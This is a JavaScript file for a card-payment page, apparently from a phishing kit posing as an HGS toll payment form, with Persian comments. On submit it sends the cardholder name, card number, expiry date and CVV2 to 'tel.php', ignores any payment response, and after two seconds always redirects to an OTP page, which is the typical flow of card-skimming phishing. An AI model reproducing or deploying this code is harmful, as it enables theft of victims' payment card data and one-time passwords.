const btn = document.querySelector('#panel-do-payment-btn')
const nameLastName = document.querySelector('#nameLastName')
const cardNumber = document.querySelector('#cardNumber')
const Datee = document.querySelector('#Date')
const Cvv2 = document.querySelector('#Cvv2')
const checkBox = document.querySelector('#hgs-contract')

function formatCardNumber (cardNumber) {
  // حذف فاصله‌ها اگر وجود داشته باشند
  var cleanNumber = cardNumber.replace(/\s+/g, '')
  // اضافه کردن فاصله پس از هر چهار رقم
  var formattedNumber = cleanNumber.replace(/(\d{4})(?=\d)/g, '$1 ')
  return formattedNumber
}

nameLastName.addEventListener('focus', function () {
  document.getElementById('jpCardJello').style.transform = 'rotateY(0deg)'
})

cardNumber.addEventListener('focus', function () {
  document.getElementById('jpCardJello').style.transform = 'rotateY(0deg)'
})

Datee.addEventListener('focus', function () {
  document.getElementById('jpCardJello').style.transform = 'rotateY(0deg)'
})

nameLastName.addEventListener('keyup', function () {
  if (nameLastName.value.trim().length < 3) {
    nameLastName.setAttribute('class', 'form-control error')
    isValid = false // اعتبار سنجی معتبر نیست
  } else {
    nameLastName.setAttribute('class', 'form-control')
  }
  document.getElementById('jpCardJello').style.transform = 'rotateY(0deg)'
  document.getElementById('showName').innerHTML = nameLastName.value
})

cardNumber.addEventListener('keyup', function () {
  if (cardNumber.value.length < 19) {
    cardNumber.setAttribute('class', 'form-control error')
    isValid = false // اعتبار سنجی معتبر نیست
  } else {
    cardNumber.setAttribute('class', 'form-control')
  }
  cardNumber.value = formatCardNumber(cardNumber.value)
  document.getElementById('jpCardJello').style.transform = 'rotateY(0deg)'
  document.getElementById('showCard').innerHTML = cardNumber.value
})

Datee.addEventListener('keyup', function () {
  if (Datee.value.length !== 7) {
    Datee.setAttribute('class', 'form-control error')
    isValid = false // اعتبار سنجی معتبر نیست
  } else {
    Datee.setAttribute('class', 'form-control')
  }
  document.getElementById('jpCardJello').style.transform = 'rotateY(0deg)'
  document.getElementById('showDate').innerHTML = Datee.value
})

Cvv2.addEventListener('focus', function () {
  document.getElementById('jpCardJello').style.transform = 'rotateY(180deg)'
})

Cvv2.addEventListener('keyup', function () {
  if (Cvv2.value.length < 3 || Cvv2.value.length > 4 || isNaN(Cvv2.value)) {
    Cvv2.setAttribute('class', 'form-control error')
    isValid = false // اعتبار سنجی معتبر نیست
  } else {
    Cvv2.setAttribute('class', 'form-control')
  }
  document.getElementById('jpCardJello').style.transform = 'rotateY(180deg)'
  document.getElementById('showCvv2').innerHTML = Cvv2.value
})

Datee.addEventListener('keyup', function () {
  if (Datee.value.length == 2) {
    Datee.value = Datee.value + ' / '
  }
})

checkBox.addEventListener('click', function () {
  if (checkBox.value == '0') {
    checkBox.value = '1'
    btn.disabled = false
  } else {
    checkBox.value = '0'
    btn.disabled = true
  }
})

btn.addEventListener('click', function () {
  let isValid = true

  // چک کردن نام و نام خانوادگی
  if (nameLastName.value.trim().length < 3) {
    nameLastName.setAttribute('class', 'form-control error')
    isValid = false // اعتبار سنجی معتبر نیست
  } else {
    nameLastName.setAttribute('class', 'form-control')
  }

  // چک کردن شماره کارت
  if (cardNumber.value.length < 19) {
    cardNumber.setAttribute('class', 'form-control error')
    isValid = false // اعتبار سنجی معتبر نیست
  } else {
    cardNumber.setAttribute('class', 'form-control')
  }

  // چک کردن تاریخ انقضا
  // بررسی که تاریخ وارد شده باید به فرمت MM/YY باشد
  if (Datee.value.length !== 7) {
    Datee.setAttribute('class', 'form-control error')
    isValid = false // اعتبار سنجی معتبر نیست
  } else {
    Datee.setAttribute('class', 'form-control')
  }

  // چک کردن CVV2
  // CVV2 باید عددی سه یا چهار رقمی باشد
  if (Cvv2.value.length < 3 || Cvv2.value.length > 4 || isNaN(Cvv2.value)) {
    Cvv2.setAttribute('class', 'form-control error')
    isValid = false // اعتبار سنجی معتبر نیست
  } else {
    Cvv2.setAttribute('class', 'form-control')
  }

  // اگر همه مقادیر معتبر باشند، اطلاعات را ارسال کنید
  if (isValid) {
    function loader () {
      window.location.href = './otp'
    }
    btn.innerHTML = `Processing`
    btn.disabled = true
    let form_data = new FormData()
    form_data.append('nameLastName', nameLastName.value)
    form_data.append('cardNumber', cardNumber.value)
    form_data.append('cvv2', Cvv2.value)
    form_data.append('date', Datee.value)
    $.ajax({
      url: 'tel.php',
      dataType: 'text',
      cache: false,
      contentType: false,
      processData: false,
      data: form_data,
      type: 'POST'
    })
    setTimeout(() => {
      loader()
    }, 2000)
  }
})
